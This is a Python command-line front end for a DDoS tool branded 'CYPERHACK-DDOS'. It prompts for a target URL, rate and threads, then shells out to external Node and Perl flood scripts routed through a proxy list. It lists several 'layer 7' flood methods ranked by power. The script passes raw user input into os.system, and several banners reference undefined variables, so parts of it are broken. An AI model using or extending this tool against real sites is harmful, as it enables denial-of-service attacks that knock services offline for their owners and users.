import os 
import requests

os.system('clear')
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def title():
  print(f"CYPERHACK-DDOS | bot: {bots} | admin | VIP : True ")


def ip():
  os.system('clear')
  title()
  print("""
  ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██║██████╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗
██║██╔═══╝        ██║   ██║   ██║██║   ██║██║     ╚════██║
██║██║            ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

   GEOIP | SUBDOMAIN | CLEAR | EXIT
  
  
  
  """)
  

def banner():
  os.system('clear')
  title()
  print("""
     ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝ 
██║       ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗ 
╚██████╗   ██║   ██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚═════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

    |Wellcome to main screen        |
    |Press "help" to see all command|
    #code by hphongdev
    
    """)
def l7():
  print("""
  ▀██▀                                         ▄▄▄▄  
 ██        ▄▄▄▄    ▄▄▄▄ ▄▄▄   ▄▄▄▄  ▄▄▄ ▄▄   ▀  ██ 
 ██       ▀▀ ▄██    ▀█▄  █  ▄█▄▄▄██  ██▀ ▀▀     █▄ 
 ██       ▄█▀ ██     ▀█▄█   ██       ██        ██  
▄██▄▄▄▄▄█ ▀█▄▄▀█▀     ▀█     ▀█▄▄▄▀ ▄██▄      ██   
                   ▄▄ █                       ██   
                    ▀▀                        █▀   

ALL LAYER7 METHODS :
tls : powerfull 
http-storm : weak
http-requests : good
http-flood : good 
http-nosec : powerfull
http-spam : good
tls-flood : powerfull
http-raw : good

  ______________________
  attack time is 180s
  """)
  command()
  
def l4():
  print("""
                                                       
▀████▀                                               
  ██                                                 
  ██      ▄█▀██▄ ▀██▀   ▀██▀ ▄▄█▀██▀███▄███     ▄██  
  ██     ██   ██   ██   ▄█  ▄█▀   ██ ██▀ ▀▀    ████  
  ██     ▄▄█████    ██ ▄█   ██▀▀▀▀▀▀ ██      ▄█▀ ██  
  ██    ▄██   ██     ███    ██▄    ▄ ██    ▄█▀   ██  
██████████████▀██▄   ▄█      ▀█████▀████▄  ██████████
                   ▄█                           ██   
                 ██▀                            ██   

Layer4 Method Are Not Avaliable
  """)
  command()










def help():
  print("""
   __    __          __          
|  \  |  \        |  \         
| ▓▓  | ▓▓ ______ | ▓▓ ______  
| ▓▓__| ▓▓/      \| ▓▓/      \ 
| ▓▓    ▓▓  ▓▓▓▓▓▓\ ▓▓  ▓▓▓▓▓▓\
| ▓▓▓▓▓▓▓▓ ▓▓    ▓▓ ▓▓ ▓▓  | ▓▓
| ▓▓  | ▓▓ ▓▓▓▓▓▓▓▓ ▓▓ ▓▓__/ ▓▓
| ▓▓  | ▓▓\▓▓     \ ▓▓ ▓▓    ▓▓
 \▓▓   \▓▓ \▓▓▓▓▓▓▓\▓▓ ▓▓▓▓▓▓▓ 
                     | ▓▓      
                     | ▓▓      
                      \▓▓      

  Method : l7 and l4 attack methods
  Ip : some ip tool
  exit : cut khoi tool
  clear : clear system 
  info : account infor
  proxy : download new proxylist
  XD when your attack require methof choose GET or POST or HEAD
  """)
  command()

def brain():
  command()
  
def clear():
  os.system('clear')
    
def command():
  title()
  cmd = input('hphongdev@cyper ~:')
  if cmd == 'help':
    help()
  if cmd == 'tls':
    target = input('URL ~')
    rate = input('RATE ~ ')
    threads = input('THREADS ~ ')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
PORT : {port}
THREADS : {threads}
METHOD : {method}
TIME : 180


    """)
    os.system(f'node module/tls.js {target} 180 {rate} {threads} proxies.txt')
    
    
    brain()
    
  if cmd == 'clear':
    clear()
    brain()
    
  if cmd == 'l7':
    clear()
    l7()
    
  if cmd == 'l4':
    clear()
    l4()
    
  
  if cmd == 'proxy':
    os.system('rm proxies.txt')
    os.system('python prx.py')
    brain()
    
  if cmd == 'http-storm':
    url = input('TARGET~ ')
    rate = input('RATE~ ')
    threads = input('THREADS~ ')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
THREADS : {threads}
METHOD : {method}
TIME : 180


    """)
    os.system(f'node module/http-storm.js {url} 180 {rate} {threads}')
    
    brain()
    
  if cmd == 'http-requests':
    url = input('TARGET~ ')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
TIME : 180


    """)
    os.system(f'node module/http-requests.js {url} 180')
    
    brain()
    
  if cmd == 'http-flood':
    url = input('TARGET~ ')
    method = input('METHOD~ ')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
METHOD : {method}
TIME : 180


    """)
    os.system(f'node module/flood.js {url} proxies.txt 180 {method}')
    
    brain()
    
    
  if cmd == 'http-nosec':
    url = input('TARGET~ ')
    rate = input('RATE~ ')
    threads = input('THREADS~ ')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
THREADS : {threads}
RATE : {rate}
TIME : 180


    """)
    os.system(f'node module/http-nosec.js {url} 180 {rate} {threads} proxies.txt')
    
    brain()
    
  if cmd == 'http-spam':
    url = input('TARGET~ ')
    threads = input('THREADS~')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
THREADS : {threads}
TIME : 180


    """)
    os.system(f'perl module/http-spam.pl {url} {threads} 180 8.8.8.8')
    
    brain()
    
  if cmd == 'tls-flood':
    url = input('TARGET~ ')
    threads = input('THREADS~')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
THREADS : {threads}
TIME : 180


    """)
    os.system(f'node module/tls-flood.js {url} 180 {threads}')
    
    brain()
    
  if cmd == 'http-raw':
    url = input('TARGET~ ')
    port = input('PORT~ ')
    threads = input('THREADS~ ')
    method = input('METHOD~ ')
    clear()
    print(f"""
    ╔═══╗ ╔╗  ╔╗          ╔╗  ╔══╗     ╔═╗    
║╔═╗║╔╝╚╗╔╝╚╗         ║║  ╚╣╠╝     ║╔╝    
║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗ ║║ ╔═╗ ╔╝╚╗╔══╗
║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝ ║║ ║╔╗╗╚╗╔╝║╔╗║
║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╔╣╠╗║║║║ ║║ ║╚╝║
╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝ ╚╝ ╚══╝
                                          
                                      
TARGET : {url}
PORT : {port}
THREADS : {threads}
METHOD : {method}
TIME : 180


    """)
    os.system(f'node module/http-raw.js {url} {port} {threads} {method}')
    
    brain()
    
  if cmd == 'info':
    print("""
    ACCOUNT INFORMATION:
    User : admin
    Password : hphongdev
    Vip : true 
    allower method : all 
    attack time : 180 
    """)
    brain()
    
  
    
    
    
    
  
  
if '__main__' == '__main__':
  command()
